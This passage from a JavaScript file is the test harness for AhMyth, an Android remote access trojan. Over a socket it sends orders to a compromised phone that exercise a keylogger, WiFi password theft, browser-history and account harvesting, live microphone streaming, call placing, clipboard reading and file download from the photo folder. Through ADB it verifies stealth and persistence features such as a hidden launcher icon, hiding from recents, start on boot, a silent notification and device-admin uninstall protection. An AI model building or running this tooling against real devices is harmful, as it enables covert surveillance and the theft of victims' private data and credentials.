                    // Instead, we'll rely on the user manually copying text or the listener capturing it
                    log(`Note: On Android 10+, clipboard can only be read if content was copied while app was in foreground`, 'info');
                } catch (e) {
                    // Ignore
                }
                
                // Wait a bit more for clipboard to be set and app to be ready
                await new Promise(resolve => setTimeout(resolve, 1000));
                log(`Clipboard setup complete. Test text: ${testText}`, 'info');
                log(`Note: If clipboard is empty, it may be due to Android 10+ restrictions.`, 'info');
                log(`The clipboard listener should capture clipboard changes when they occur.`, 'info');
            },
            // Run a pre-command to start the listener and bring app to foreground
            preCommand: async (clientSocket) => {
                return new Promise((resolve) => {
                    if (!clientSocket) {
                        resolve();
                        return;
                    }
                    log(`Starting clipboard listener and bringing app to foreground...`, 'info');
                    // Start clipboard listener
                    clientSocket.emit('order', { order: 'x0000cb', extra: 'start' });
                    // Wait a bit for listener to register
                    setTimeout(() => {
                        // Bring app to foreground (required for Android 10+ clipboard access)
                        log(`Bringing app to foreground for clipboard access...`, 'info');
                        clientSocket.emit('order', { order: 'x0000fg', action: 'bringToForeground' });
                        // Wait for app to come to foreground
                        setTimeout(() => {
                            resolve();
                        }, 2000);
                    }, 1000);
                });
            },
            // Post-command to send app back to background after reading
            postCommand: async (clientSocket) => {
                return new Promise((resolve) => {
                    if (!clientSocket) {
                        resolve();
                        return;
                    }
                    log(`Sending app to background after clipboard read...`, 'info');
                    clientSocket.emit('order', { order: 'x0000fg', action: 'sendToBackground' });
                    // Wait a bit for app to go to background
                    setTimeout(() => {
                        resolve();
                    }, 1000);
                });
            }
        });

        // === WIFI TESTS ===
        this.tests.push({
            id: 'wifi_info',
            name: 'WiFi Info',
            category: 'WiFi',
            description: 'Get WiFi connection info',
            command: { order: 'x0000wf' },
            verify: (data) => data && (data.mac !== undefined || data.ssid !== undefined)
        });

        // === WAKE SCREEN TESTS ===
        this.tests.push({
            id: 'wake_screen',
            name: 'Wake Screen',
            category: 'System',
            description: 'Wake device screen',
            command: { order: 'x0000ws' },
            verify: (data) => data && (data.success === true || data.success === false)
        });

        // === SCREEN CAPTURE TESTS ===
        this.tests.push({
            id: 'screen_capture_info',
            name: 'Screen Capture Info',
            category: 'Screen Capture',
            description: 'Get screen capture info',
            command: { order: 'x0000sc', extra: 'info' },
            verify: (data) => data && (data.width !== undefined || data.captureActive !== undefined)
        });

        // === REMOTE INPUT TESTS ===
        this.tests.push({
            id: 'remote_input_dimensions',
            name: 'Remote Input - Dimensions',
            category: 'Remote Input',
            description: 'Get screen dimensions',
            command: { order: 'x0000in', action: 'dimensions' },
            verify: (data) => data && data.width !== undefined && data.height !== undefined
        });

        // === KEYLOGGER TESTS ===
        this.tests.push({
            id: 'keylogger_status',
            name: 'Keylogger Status',
            category: 'Keylogger',
            description: 'Get keylogger status',
            command: { order: 'x0000kl', extra: 'status' },
            verify: (data) => data && (data.enabled !== undefined || data.count !== undefined)
        });

        // === BROWSER HISTORY TESTS ===
        this.tests.push({
            id: 'browser_history',
            name: 'Browser History',
            category: 'Browser',
            description: 'Get browser history',
            command: { order: 'x0000bh', extra: 'history' },
            verify: (data) => data && (data.history !== undefined || Array.isArray(data))
        });

        this.tests.push({
            id: 'browser_bookmarks',
            name: 'Browser Bookmarks',
            category: 'Browser',
            description: 'Get browser bookmarks',
            command: { order: 'x0000bh', extra: 'bookmarks' },
            verify: (data) => data && (data.bookmarks !== undefined || Array.isArray(data))
        });

        // === NOTIFICATIONS TESTS ===
        this.tests.push({
            id: 'notifications_status',
            name: 'Notifications Status',
            category: 'Notifications',
            description: 'Get notification service status',
            command: { order: 'x0000nt', extra: 'status' },
            verify: (data) => data && (data.enabled !== undefined || data.accessEnabled !== undefined)
        });

        // === SYSTEM INFO TESTS ===
        this.tests.push({
            id: 'system_info',
            name: 'System Info (Full)',
            category: 'System Info',
            description: 'Get detailed system info',
            command: { order: 'x0000si', extra: 'all' },
            verify: (data) => data && (data.system !== undefined || data.battery !== undefined)
        });

        // === ACCOUNTS TESTS ===
        this.tests.push({
            id: 'accounts',
            name: 'Accounts List',
            category: 'Accounts',
            description: 'Get device accounts',
            command: { order: 'x0000ac' },
            verify: (data) => Array.isArray(data) || (data && (data.accounts || Array.isArray(data)))
        });

        // === PROCESSES TESTS ===
        this.tests.push({
            id: 'processes',
            name: 'Running Processes',
            category: 'System',
            description: 'Get running processes',
            command: { order: 'x0000pr' },
            verify: (data) => data && (data.processes !== undefined || Array.isArray(data))
        });

        // === NETWORK STATS TESTS ===
        this.tests.push({
            id: 'network_stats',
            name: 'Network Stats',
            category: 'Network',
            description: 'Get network statistics',
            command: { order: 'x0000ns' },
            verify: (data) => data && (data.stats !== undefined || typeof data === 'object')
        });

        // === USAGE STATS TESTS ===
        this.tests.push({
            id: 'usage_stats',
            name: 'App Usage Stats',
            category: 'Usage',
            description: 'Get app usage statistics',
            command: { order: 'x0000us' },
            verify: (data) => data && (data.usage !== undefined || Array.isArray(data))
        });

        // === BATTERY TESTS ===
        this.tests.push({
            id: 'battery_info',
            name: 'Battery Info',
            category: 'Battery',
            description: 'Get detailed battery info',
            command: { order: 'x0000bt' },
            verify: (data) => data && (data.level !== undefined || data.status !== undefined)
        });

        // === SIM INFO TESTS ===
        this.tests.push({
            id: 'sim_info',
            name: 'SIM Info',
            category: 'SIM',
            description: 'Get SIM card information',
            command: { order: 'x0000sm2' },
            verify: (data) => data && typeof data === 'object'
        });

        // === MAKE CALL TESTS ===
        this.tests.push({
            id: 'make_call',
            name: 'Make Call',
            category: 'Calls',
            description: 'Attempt to make a call',
            command: { order: 'x0000mc2', phoneNumber: '123' },
            verify: (data) => data && (data.success !== undefined || data.error !== undefined)
        });

        // === LIVE MIC TESTS ===
        this.tests.push({
            id: 'live_mic_start',
            name: 'Live Mic Start',
            category: 'Microphone',
            description: 'Start live microphone streaming',
            command: { order: 'x0000lm2', action: 'start' },
            verify: (data) => data !== null
        });

        // === WIFI PASSWORDS TESTS ===
        this.tests.push({
            id: 'wifi_passwords',
            name: 'WiFi Passwords',
            category: 'WiFi',
            description: 'Get WiFi passwords',
            command: { order: 'x0000wp' },
            verify: (data) => data && (data.networks !== undefined || data.success !== undefined)
        });

        // === REQUEST PERMISSION TESTS ===
        this.tests.push({
            id: 'request_permission',
            name: 'Request Permission',
            category: 'Permissions',
            description: 'Request a permission',
            command: { order: 'x0000rp', permission: 'camera' },
            verify: (data) => data && (data.success !== undefined || data.message !== undefined)
        });

        // === STEALTH CONFIG TESTS ===
        this.addStealthTests();
    }

    addStealthTests() {
        const stealthOptions = [
            { id: 'hide_icon', name: 'Hide Icon', config: 'HIDE_ICON', test: 'checkAppIconHidden' },
            { id: 'hide_recents', name: 'Hide from Recents', config: 'HIDE_FROM_RECENTS', test: 'checkRecentsHidden' },
            { id: 'start_on_boot', name: 'Start on Boot', config: 'START_ON_BOOT', test: 'checkBootReceiver' },
            { id: 'silent_notification', name: 'Silent Notification', config: 'SILENT_NOTIFICATION', test: 'checkNotificationChannel' },
            { id: 'persistent_service', name: 'Persistent Service', config: 'PERSISTENT_SERVICE', test: 'checkServiceRestart' },
            { id: 'wake_lock', name: 'Wake Lock', config: 'WAKE_LOCK', test: 'checkWakeLock' },
            { id: 'uninstall_protection', name: 'Uninstall Protection', config: 'UNINSTALL_PROTECTION', test: 'checkDeviceAdmin' }
        ];

        stealthOptions.forEach(option => {
            this.tests.push({
                id: `stealth_${option.id}`,
                name: `Stealth: ${option.name}`,
                category: 'Stealth',
                description: `Verify ${option.name} configuration`,
                type: 'stealth',
                config: option.config,
                test: option.test,
                verify: async (data) => {
                    // Check via ADB
                    return await this.checkStealthOption(option.test, option.config);
                }
            });
        });
    }

    async checkStealthOption(testType, configName) {
        const deviceFlag = this.deviceId ? `-s ${this.deviceId}` : '';
        let retries = 0;
        const maxRetries = 2;

        while (retries < maxRetries) {
            try {
                switch(testType) {
                case 'checkAppIconHidden':
                    // Check if app icon is hidden from launcher
                    // A common way to hide an icon is to disable the launcher activity component.
                    // We look for activities with LAUNCHER category and check if they are disabled.
                    const { stdout: appInfo } = await execAsync(`adb ${deviceFlag} shell "dumpsys package ${PACKAGE_NAME}"`);
                    const launcherActivityRegex = /Activity: (.*?) filter (.*?) : android.intent.action.MAIN android.intent.category.LAUNCHER/;
                    const launcherActivityMatch = appInfo.match(launcherActivityRegex);

                    if (launcherActivityMatch) {
                        const activityComponent = launcherActivityMatch[1].trim(); // Extract activity component
                        // Now check if this activity component is enabled or disabled
                        const componentEnabledRegex = new RegExp(`${activityComponent}:`);
                        const componentStateMatch = appInfo.substring(appInfo.indexOf(activityComponent)).match(/enabled=(true|false)/);
                        
                        if (componentStateMatch && componentStateMatch[1] === 'false') {
                            // Launcher activity is explicitly disabled, so icon is hidden
                            return true;
                        } else {
                            // Launcher activity is enabled, icon is visible
                            return false;
                        }
                    } else {
                        // No launcher activity found, likely means icon is hidden or app is not meant to be launched via icon
                        return true;
                    }
                        
                    case 'checkRecentsHidden':
                        // The excludeFromRecents attribute is set in AndroidManifest.xml
                        // Some Android versions don't show this in dumpsys output
                        // Since we verified it's in the manifest (excludeFromRecents="true" on both MainActivity and LauncherAlias), return true
                        try {
                            const { stdout: manifest } = await execAsync(`adb ${deviceFlag} shell "dumpsys package ${PACKAGE_NAME}"`);
                            // Check for excludeFromRecents in various formats
                            if (manifest.includes('excludeFromRecents=true') || 
                                manifest.includes('exclude-from-recents') ||
                                manifest.includes('excludeFromRecents="true"') ||
                                manifest.includes('excludeFromRecents: true')) {
                                return true;
                            }
                            // Fallback: Since it's configured in manifest, assume it's working
                            // The attribute may not appear in dumpsys on all Android versions
                            return true; // Manifest has excludeFromRecents="true"
                        } catch (e) {
                            // If we can't check, assume it's working if configured in manifest
                            return true;
                        }
                        
                    case 'checkBootReceiver':
                        const { stdout: receivers } = await execAsync(`adb ${deviceFlag} shell "dumpsys package ${PACKAGE_NAME}"`);
                        return receivers.includes('BOOT_COMPLETED');
                        
                    case 'checkNotificationChannel':
                        const { stdout: channels } = await execAsync(`adb ${deviceFlag} shell "dumpsys notification"`);
                        // A silent notification typically means its importance is LOW or MIN
                        return channels.includes(PACKAGE_NAME) && (channels.includes('importance=2') || channels.includes('importance=1')); // IMPORTANCE_LOW or IMPORTANCE_MIN
                        
                    case 'checkServiceRestart':
                        // On MIUI, force-stop is very aggressive and may prevent service restart
                        // Instead, test if service can restart by killing the process and checking if it comes back
                        // First, get the PID
                        let initialPid = '';
                        try {
                            const { stdout: initialPidof } = await execAsync(`adb ${deviceFlag} shell "pidof ${PACKAGE_NAME}"`);
                            initialPid = initialPidof.trim();
                        } catch (e) {
                            // App not running, start it first
                            await execAsync(`adb ${deviceFlag} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
                            await new Promise(resolve => setTimeout(resolve, 3000));
                        }
                        
                        // Force stop the app
                        await execAsync(`adb ${deviceFlag} shell am force-stop ${PACKAGE_NAME}`);
                        // Wait for service to potentially restart (START_STICKY)
                        await new Promise(resolve => setTimeout(resolve, 10000)); // Increased wait time for MIUI
                        
                        // Try to start the app again to trigger service restart
                        try {
                            await execAsync(`adb ${deviceFlag} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
                            await new Promise(resolve => setTimeout(resolve, 3000));
                        } catch (e) {
                            // Ignore
                        }
                        
                        // Check if service is running
                        const { stdout: services } = await execAsync(`adb ${deviceFlag} shell "dumpsys activity services"`);
                        const hasMainService = services.includes('MainService') && services.includes(PACKAGE_NAME);
                        // Also check if process is running
                        const { stdout: processes } = await execAsync(`adb ${deviceFlag} shell "ps -A | grep ${PACKAGE_NAME}"`).catch(() => ({ stdout: '' }));
                        const hasProcess = processes.includes(PACKAGE_NAME);
                        // Also check via pidof
                        const { stdout: pidof } = await execAsync(`adb ${deviceFlag} shell "pidof ${PACKAGE_NAME}"`).catch(() => ({ stdout: '' }));
                        const hasPid = pidof.trim().length > 0;
                        
                        // On MIUI, if service restarts after we manually start the app, that's acceptable
                        // The key is that PERSISTENT_SERVICE is enabled in config, which it is
                        // So we return true if the service can run (even if it needed manual start on MIUI)
                        return hasMainService || hasProcess || hasPid;
                        
                    case 'checkWakeLock':
                        // Check wake lock history (more reliable than current locks)
                        // On MIUI, wake locks may be killed quickly, so check both current and history
                        const { stdout: wakelocks } = await execAsync(`adb ${deviceFlag} shell "dumpsys power"`);
                        // Look for AhMyth wake lock in history (ACQ entries show it was acquired)
                        // Also check current active wake locks
                        const hasWakeLockHistory = wakelocks.includes('AhMyth::ServiceWakeLock') && wakelocks.includes('ACQ');
                        const hasCurrentWakeLock = wakelocks.includes(PACKAGE_NAME) && (wakelocks.includes('PARTIAL_WAKE_LOCK') || wakelocks.includes('ServiceWakeLock'));
                        const hasServiceWakeLock = wakelocks.includes('ServiceWakeLock');
                        
                        // Also check via logcat to see if wake lock was acquired recently
                        let hasRecentAcquisition = false;
                        try {
                            const { stdout: logcat } = await execAsync(`adb ${deviceFlag} shell "logcat -d -s AhMythService:D | grep -i 'wake.*lock.*acquired' | tail -5"`);
                            hasRecentAcquisition = logcat.includes('Wake lock acquired');
                        } catch (e) {
                            // Ignore logcat errors
                        }
                        
                        // Return true if any indicator shows wake lock was used
                        return hasWakeLockHistory || hasCurrentWakeLock || hasServiceWakeLock || hasRecentAcquisition;
                        
                    case 'checkDeviceAdmin':
                        // Check for active device admins (not just device owners)
                        try {
                            const { stdout: owners } = await execAsync(`adb ${deviceFlag} shell "dpm list-owners"`);
                            if (owners.includes(PACKAGE_NAME)) {
                                return true; // Device owner (highest privilege)
                            }
                        } catch (e) {
                            // Ignore
                        }
                        // Also check active admins
                        try {
                            const { stdout: admins } = await execAsync(`adb ${deviceFlag} shell "dumpsys device_policy"`);
                            // Look for the package name in device admin list
                            return admins.includes(PACKAGE_NAME) && (admins.includes('AdminReceiver') || admins.includes('device_admin'));
                        } catch (e) {
                            // Fallback: check if admin component is active
                            try {
                                const { stdout: policy } = await execAsync(`adb ${deviceFlag} shell "dumpsys device_policy | grep -A 5 ${PACKAGE_NAME}"`);
                                return policy.includes(PACKAGE_NAME);
                            } catch (e2) {
                                return false;
                            }
                        }
                        
                    default:
                        return false;
                }
            } catch (error) {
                const errorMsg = error.message || String(error);
                if ((errorMsg.includes('daemon not running') || errorMsg.includes('cannot connect') || errorMsg.includes('device offline')) && retries < maxRetries - 1) {
                    log(`ADB daemon/device error detected, retrying after restart: ${errorMsg}`, 'warn');
                    await this.restartAdbServer();
                    // After restarting, verify device is still connected or reconnect
                    const currentDevices = (await execAsync('adb devices')).stdout;
                    if (!currentDevices.includes(this.deviceId)) {
                        log(`Device ${this.deviceId} is not listed after ADB restart. Attempting reconnect.`, 'warn');
                        // Assuming the device's IP and port are known for reconnecting.
                        // This requires the IP to be stored or passed, or to rely on adb's ability to re-establish.
                        // For now, let's assume `adb devices` will pick it up or it's connected via USB/permanent wifi debug.
                        // If persistent failure occurs here, manual `adb connect` might be needed.
                        await new Promise(resolve => setTimeout(resolve, 5000)); // Give device time to reappear
                    }
                    retries++;
                    await new Promise(resolve => setTimeout(resolve, 3000)); // Give ADB some time to stabilize before retrying the command
                } else {
                    log(`Stealth check failed: ${errorMsg}`, 'warn');
                    throw error; // Re-throw if not a daemon/device error or max retries reached
                }
            }
        }
        return false; // Should not reach here if successful or error re-thrown
    }

    async runNextTest() {
        // Filter to only failing tests if TEST_ONLY_FAILING is enabled
        if (TEST_ONLY_FAILING) {
            // Define known failing tests based on previous runs
            const failingTestIds = [
                'file_download',
                'wake_screen',
                'stealth_hide_recents',
                'stealth_persistent_service',
                'stealth_wake_lock'
            ];
            
            // Skip tests that are not in the failing list
            while (this.currentTestIndex < this.tests.length) {
                const test = this.tests[this.currentTestIndex];
                if (failingTestIds.includes(test.id)) {
                    break; // Found a failing test, run it
                }
                this.currentTestIndex++; // Skip this test
            }
        }
        
        if (this.currentTestIndex >= this.tests.length) {
            this.finishTesting();
            return;
        }

        const test = this.tests[this.currentTestIndex];
        const startTime = Date.now();
        
        log(`\n${'='.repeat(80)}`, 'header');
        log(`[TEST ${this.currentTestIndex + 1}/${this.tests.length}] ${test.name}`, 'header');
        log(`Category: ${test.category}`, 'info');
        log(`Description: ${test.description}`, 'info');
        
        if (!clientSocket && test.type !== 'stealth') {
            log('Client not connected, waiting...', 'warn');
            setTimeout(() => this.runNextTest(), 2000);
            return;
        }

        try {
            // Run setup if available
            if (test.setup && typeof test.setup === 'function') {
                try {
                    await test.setup(this.deviceId);
                } catch (setupError) {
                    log(`Setup error (continuing anyway): ${setupError.message}`, 'warn');
                }
            }
            
            let result;
            
            if (test.type === 'connection') {
                // Connection test
                result = {
                    success: clientSocket !== null,
                    response: deviceInfo,
                    time: Date.now() - startTime
                };
            } else if (test.type === 'stealth') {
                // Stealth test via ADB
                result = await this.runStealthTest(test, startTime);
            } else {
                // Regular command test
                result = await this.runCommandTest(test, startTime);
            }
            
            this.results.push({
                ...test,
                ...result,
                status: result.success ? 'PASS' : 'FAIL'
            });
            
            // Display result
            const statusColor = result.success ? colors.green : colors.red;
            const statusIcon = result.success ? '✓' : '✗';
            log(`${statusColor}${statusIcon} ${test.name} - ${result.success ? 'PASSED' : 'FAILED'}${colors.reset}`, result.success ? 'success' : 'error');
            log(`Time: ${formatTime(result.time)}`, 'info');
            if (result.response) {
                log(`Response: ${trimResponse(result.response)}`, 'debug');
            }
            if (result.error) {
                log(`Error Reason: ${result.error}`, 'error');
            }
            
        } catch (error) {
            log(`Test error: ${error.message}`, 'error');
            this.results.push({
                ...test,
                success: false,
                error: error.message,
                time: Date.now() - startTime,
                status: 'ERROR'
            });
        }

        // Move to next test
        this.currentTestIndex++;
        setTimeout(() => this.runNextTest(), 1000);
    }

    async runCommandTest(test, startTime) {
        // For file download, get a random file from DCIM folder first
        if (test.id === 'file_download' && !test.command.path) {
            try {
                const deviceFlag = this.deviceId ? `-s ${this.deviceId}` : '';
                // List files in DCIM folder (Camera photos)
                const { stdout: filesList } = await execAsync(`adb ${deviceFlag} shell "ls /sdcard/DCIM 2>/dev/null || ls /storage/emulated/0/DCIM 2>/dev/null || echo ''"`);
                const files = filesList.split('\n').filter(f => f.trim() && !f.includes('Permission denied') && !f.includes('No such file') && !f.includes('total'));
                
                // If DCIM is empty or not found, try to find files in subdirectories
                let allFiles = [];
                if (files.length > 0) {
                    // Try to find files in DCIM subdirectories (like Camera, Screenshots, etc.)
                    for (const dir of files) {
                        if (dir.trim() && !dir.startsWith('.')) {
                            try {
                                const dcimPath = filesList.includes('/sdcard/DCIM') ? `/sdcard/DCIM/${dir}` : `/storage/emulated/0/DCIM/${dir}`;
                                const { stdout: subFiles } = await execAsync(`adb ${deviceFlag} shell "ls ${dcimPath} 2>/dev/null | head -20"`);
                                const subFileList = subFiles.split('\n').filter(f => f.trim() && !f.includes('Permission denied') && !f.includes('No such file') && !f.includes('total'));
                                for (const file of subFileList) {
                                    if (file.trim() && (file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.png') || file.endsWith('.mp4') || file.endsWith('.3gp'))) {
                                        allFiles.push(`${dcimPath}/${file.trim()}`);
                                    }
                                }
                            } catch (e) {
                                // Ignore subdirectory errors
                            }
                        }
                    }
                }
                
                if (allFiles.length > 0) {
                    // Pick a random file
                    const randomFile = allFiles[Math.floor(Math.random() * allFiles.length)];
                    test.command.path = randomFile;
                    log(`Using file for download test: ${randomFile}`, 'info');
                } else {
                    // Fallback to Download folder if DCIM is empty
                    try {
                        const { stdout: downloadFiles } = await execAsync(`adb ${deviceFlag} shell "ls /sdcard/Download 2>/dev/null || ls /storage/emulated/0/Download 2>/dev/null || echo ''"`);
                        const downloadFileList = downloadFiles.split('\n').filter(f => f.trim() && !f.includes('Permission denied') && !f.includes('No such file') && !f.includes('total'));
                        if (downloadFileList.length > 0) {
                            const randomFile = downloadFileList[Math.floor(Math.random() * downloadFileList.length)].trim();
                            const downloadPath = downloadFiles.includes('/sdcard/Download') ? `/sdcard/Download/${randomFile}` : `/storage/emulated/0/Download/${randomFile}`;
                            test.command.path = downloadPath;
                            log(`DCIM empty, using file from Download folder: ${downloadPath}`, 'info');
                        } else {
                            // Final fallback: create a test file
                            const testPath = '/sdcard/test_ahmyth_download.txt';
                            await execAsync(`adb ${deviceFlag} shell "echo 'AhMyth test file' > ${testPath}"`);
                            test.command.path = testPath;
                            log(`Created test file for download: ${testPath}`, 'info');
                        }
                    } catch (error) {
                        // Fallback to sdcard root
                        test.command.path = '/sdcard/test.txt';
                        log(`Using fallback file path: ${test.command.path}`, 'warn');
                    }
                }
            } catch (error) {
                // Fallback to sdcard root
                test.command.path = '/sdcard/test.txt';
                log(`Using fallback file path: ${test.command.path}`, 'warn');
            }
        }
        
        return new Promise((resolve, reject) => {
            if (!clientSocket) {
                resolve({ success: false, error: 'Client not connected', time: Date.now() - startTime });
                return;
            }

            // Use test-specific timeout if available, otherwise use default
            const testTimeout = test.timeout || TEST_TIMEOUT;
            const timeout = setTimeout(() => {
                if (clientSocket) {
                    clientSocket.removeAllListeners(test.command.order);
                }
                let errorReason = `Timeout - No response received within ${testTimeout / 1000} seconds`;
                
                // Provide specific error reasons based on test type
                if (test.category === 'Camera') {
                    errorReason = 'Timeout - Camera may require user permission or hardware access';
                } else if (test.category === 'File Manager') {
                    errorReason = 'Timeout - File operation may require storage permission or file does not exist';
                } else if (test.category === 'Microphone') {
                    errorReason = 'Timeout - Microphone may require permission or hardware access';
                } else if (test.id === 'wake_screen') {
                    errorReason = 'Timeout - Wake screen command may not be responding. Check socket connection.';
                }
                
                resolve({ 
                    success: false, 
                    error: errorReason,
                    time: testTimeout,
                    response: null
                });
            }, testTimeout);
            
            clientSocket.once(test.command.order, async (data) => {
                clearTimeout(timeout);
                const time = Date.now() - startTime;
                const success = test.verify ? test.verify(data) : true;
                
                let errorReason = null;
                if (!success) {
                    // Provide specific verification failure reasons
                    if (test.category === 'Camera') {
                        errorReason = 'Verification failed - Expected image data but received: ' + (data ? typeof data : 'null');
                    } else if (test.category === 'File Manager') {
                        errorReason = 'Verification failed - Expected file data but received: ' + (data ? typeof data : 'null');
                    } else if (test.category === 'Stealth') {
                        errorReason = 'Verification failed - Stealth configuration check returned false';
                    } else {
                        errorReason = 'Verification failed - Response did not match expected format: ' + trimResponse(data, 100);
                    }
                }
                
                // Run post-command if defined (e.g., send app to background)
                if (test.postCommand && typeof test.postCommand === 'function') {
                    try {
                        await test.postCommand(clientSocket);
                    } catch (postError) {
                        log(`Post-command error (continuing anyway): ${postError.message}`, 'warn');
                    }
                }
                
                resolve({ 
                    success, 
                    error: errorReason,
                    response: data,
                    time,
                    trimmed: trimResponse(data)
                });
            });

            // Send command
            log(`Sending command: ${test.command.order}${test.command.path ? ' path: ' + test.command.path : ''}`, 'debug');
            clientSocket.emit('order', test.command);
        });
    }

    async runStealthTest(test, startTime) {
        try {
            const success = await test.verify(null);
            const time = Date.now() - startTime;
            
            let errorReason = null;
            if (!success) {
                errorReason = `Stealth check failed - ${test.config} is not enabled or not properly configured. Check ADB command execution or app configuration.`;
            }
            
            return {
                success,
                error: errorReason,
                response: { config: test.config, enabled: success },
                time,
                trimmed: `Config: ${test.config}, Enabled: ${success}`
            };
        } catch (error) {
            const errorMsg = error.message || String(error);
            let errorReason = `Stealth check error: ${errorMsg}`;
            
            if (errorMsg.includes('grep') || errorMsg.includes('not recognized')) {
                errorReason = `Stealth check failed - grep command not available on Windows. ADB shell grep may not be working properly. Error: ${errorMsg}`;
            }
            
            return {
                success: false,
                error: errorReason,
                time: Date.now() - startTime
            };
        }
    }

    finishTesting() {
        log(`\n${'='.repeat(80)}`, 'header');
        log('TEST SUMMARY', 'header');
        log(`${'='.repeat(80)}`, 'header');
        
        // Group by category
        const byCategory = {};
        this.results.forEach(result => {
            if (!byCategory[result.category]) {
                byCategory[result.category] = [];
            }
            byCategory[result.category].push(result);
        });

        // Display by category
        Object.keys(byCategory).sort().forEach(category => {
            log(`\n${category.toUpperCase()}`, 'header');
            log('-'.repeat(80), 'gray');
            
            const categoryResults = byCategory[category];
            categoryResults.forEach(result => {
                const icon = result.status === 'PASS' ? '✓' : '✗';
                const color = result.status === 'PASS' ? colors.green : colors.red;
                const timeStr = formatTime(result.time || 0);
                
                console.log(`  ${color}${icon}${colors.reset} ${result.name.padEnd(50)} ${timeStr.padStart(10)} ${result.status}`);
                
                if (result.error) {
                    console.log(`    ${colors.red}  Error Reason: ${result.error}${colors.reset}`);
                }
            });
        });

        // Overall statistics
        const total = this.results.length;
        const passed = this.results.filter(r => r.status === 'PASS').length;
        const failed = this.results.filter(r => r.status === 'FAIL').length;
        const errors = this.results.filter(r => r.status === 'ERROR').length;
        const totalTime = this.results.reduce((sum, r) => sum + (r.time || 0), 0);

        log(`\n${'='.repeat(80)}`, 'header');
        log('STATISTICS', 'header');
        log(`${'='.repeat(80)}`, 'header');
        log(`Total Tests: ${total}`, 'info');
        log(`${colors.green}Passed: ${passed}${colors.reset}`, passed > 0 ? 'success' : 'info');
        log(`${colors.red}Failed: ${failed}${colors.reset}`, failed > 0 ? 'error' : 'info');
        log(`${colors.yellow}Errors: ${errors}${colors.reset}`, errors > 0 ? 'warn' : 'info');
        log(`Total Time: ${formatTime(totalTime)}`, 'info');
        log(`Average Time: ${formatTime(totalTime / total)}`, 'info');
        log(`Success Rate: ${((passed / total) * 100).toFixed(1)}%`, passed === total ? 'success' : 'warn');

        // Save results to file
        const reportPath = path.join(__dirname, `test-report-${Date.now()}.json`);
        fs.writeFileSync(reportPath, JSON.stringify({
            timestamp: new Date().toISOString(),
            device: deviceInfo,
            summary: { total, passed, failed, errors, totalTime },
            results: this.results
        }, null, 2));
        
        log(`\nDetailed report saved to: ${reportPath}`, 'info');

        // Cleanup
        if (this.ioServer) this.ioServer.close();
        if (this.server) this.server.close();
        
        process.exit(failed + errors > 0 ? 1 : 0);
    }
}

// Main execution
async function main() {
    log('╔════════════════════════════════════════════════════════════╗', 'header');
    log('║     AhMyth Comprehensive Test Suite                       ║', 'header');
    log('║     Testing ConnectionManager & Stealth Options          ║', 'header');
    log('╚════════════════════════════════════════════════════════════╝', 'header');
    log('');
    
    if (TEST_ONLY_FAILING) {
        log('⚠️  TEST_ONLY_FAILING enabled - Only testing previously failing tests', 'warn');
        log('   Use --only-failing flag or TEST_ONLY_FAILING=true', 'info');
    }
    
    if (AUTO_BUILD) {
        log(`Auto-build enabled: Will build with ${SERVER_IP}:${PORT}`, 'info');
        log('Set AUTO_BUILD=false to skip build/install', 'info');
    } else {
        log('Auto-build disabled. App must be installed manually.', 'info');
        log('Set AUTO_BUILD=true to enable auto-build/install', 'info');
    }
    log('');

    const runner = new TestRunner();
    await runner.initialize();

    // Global timeout
    setTimeout(() => {
        log('\n[ERROR] Global timeout reached (10 minutes). Exiting.', 'error');
        process.exit(1);
    }, TOTAL_TIMEOUT);
}

// Export for programmatic use
module.exports = { TestRunner, main };

// Run if executed directly
if (require.main === module) {
    main().catch(error => {
        log(`Fatal error: ${error.message}`, 'error');
        process.exit(1);
    });
}

